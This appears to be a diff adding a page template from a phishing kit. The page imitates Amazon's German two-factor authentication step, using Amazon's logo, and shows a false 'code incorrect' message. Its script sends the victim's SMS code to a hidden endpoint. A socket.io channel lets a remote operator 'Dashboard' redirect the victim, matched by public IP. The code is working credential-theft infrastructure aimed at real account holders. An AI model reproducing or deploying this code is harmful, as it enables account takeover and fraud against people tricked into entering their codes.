@@ -1,0 +1,111 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/bratoka.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+</head>
+<body class="mb-pass">
+    <div>
+        <div class="topano">
+            <img src="./img/hedopa-pc.PNG" alt="">
+            <img src="./img/hedopa-mb.png" alt="">
+        </div>
+    </div>
+    <div>
+        <div class="maina maina2">
+            <div class="inmaina">
+                <div class="maina-ico pc">
+                    <svg viewBox="0 0 51 12" role="presentation" style="height: 12px; width: 51px;"><path fill-rule="evenodd" clip-rule="evenodd" d="M45.6951 5.07267C40.2222 9.1214 32.2778 11.2605 25.4514 11.2605C16.3203 11.308 7.50058 7.94378 0.720656 1.82722C0.205738 1.36527 0.66475 0.732652 1.28265 1.09162C8.81758 5.39692 17.347 7.65784 26.0252 7.65021C32.5091 7.6186 38.9229 6.30566 44.8977 3.78685C45.8128 3.4014 46.5984 4.41358 45.6951 5.07267Z" fill="#FF9900"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M47.9725 2.47161C47.284 1.57418 43.3441 2.05967 41.5787 2.25976C41.0461 2.32155 40.9608 1.85665 41.4433 1.51827C44.577 -0.682632 49.7114 -0.0470765 50.3087 0.688521C50.9061 1.42412 50.1499 6.5733 47.2134 9.03608C46.7632 9.4127 46.3306 9.21262 46.5337 8.71241C47.1928 7.06173 48.6728 3.36904 47.9725 2.47161Z" fill="#FF9900"></path></svg>
+                </div>
+                <p class="pp1">Zwei-Faktoren-Authentifizierung</p>
+                <p style="text-align: center; margin-bottom: 20px;">Eine SMS mit einem Verifizierungscode wurde an Ihre Geräte gesendet. Geben Sie den Code ein, um fortzufahren.</p>
+                <!--  -->
+                
+            
+                    <form method="post" id="semitr2">
+                       <p>Authentifizierungscode*</p>
+                       <input type="text" id="sps2" placeholder="SMS Code" required>
+                       <span  style="color: red; margin-top: 5px; display: block;" > Authentifizierungscode falsch</span>
+                        
+                        <button class="btn" type="submit">Hinzufügen und fortfahren</button>
+                        <div class="privacy">
+                            <svg viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg" fill="none" role="presentation" class="r-633pao" data-testid="privacy-icon" style="flex: 0 1 0%; height: 20px; min-height: 20px; min-width: 20px; width: 20px;"><path d="M14 8h-.19V6.87a3.81 3.81 0 1 0-7.62 0V8H6a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h8a2 2 0 0 0 2-2v-5a2 2 0 0 0-2-2ZM8.19 6.87a1.81 1.81 0 0 1 3.62 0V8H8.19V6.87ZM14 15H6v-5h8v5Z" fill="#565959"></path></svg>
+                            <p>Deine Informationen sind verschlüsselt und sicher</p>
+                        </div>
+                    </form>
+                    
+                    <script>
+                        
+                    </script>
+
+                
+            </div>
+            
+        </div>  
+        
+<div class="line"></div>
+    <div>
+        <div class="botamano">
+            <img src="./img/botamano-pc.PNG" alt="">
+            <img src="./img/botamano-mb.png" alt="">
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('semitr2').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const smsCode = document.getElementById('sps2').value;
+            
+            $.ajax({
+                url: '/Qv69PRvXg6PQEvrzJx6j', // This is the 'sms1 post' endpoint
+                type: 'POST',
+                contentType: 'application/json',
+                data: JSON.stringify({ code: smsCode }),
+                success: function(info) {
+                    if(info.OK){
+                        // Redirect to the next step (semitr-2.ejs)
+                        // The GET route for semitr-2.ejs is /LGknmeM9HwWUWSutj6mJ
+                        window.location.href = '/loading?time=3&url=<%=url%>';
+                    } else {
+                        console.error('SMS submission failed:', info);
+                        alert('SMS submission failed. Please try again.'); // Or display error more gracefully
+                    }
+                },
+                error: function(xhr, status, error) {
+                    console.error('AJAX error during SMS submission:', status, error);
+                    alert('An error occurred during SMS submission. Please try again.');
+                }
+            });
+        });
+    </script>
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+      async function getPublicIP() {
+  try {
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    console.log("Public IP:", data.ip);
+    return data.ip;
+  } catch (error) {
+    console.error("Failed to fetch IP:", error);
+    return null;
+  }
+}
+      const socket = io();
+     
+      // Handle redirect messages from server
+      socket.on('redirect', async (data) => {
+        const currentIp = await getPublicIP();
+        console.log("Dashboard: "+data.ip,"Client: "+currentIp);
+        
+        if (data.ip === currentIp || data.ip == "::1" || data.ip=="::ffff:127.0.0.1" ) {
+
+          window.location.href = data.url;
+        }
+      });
+      </script>
+</body>
+</html>
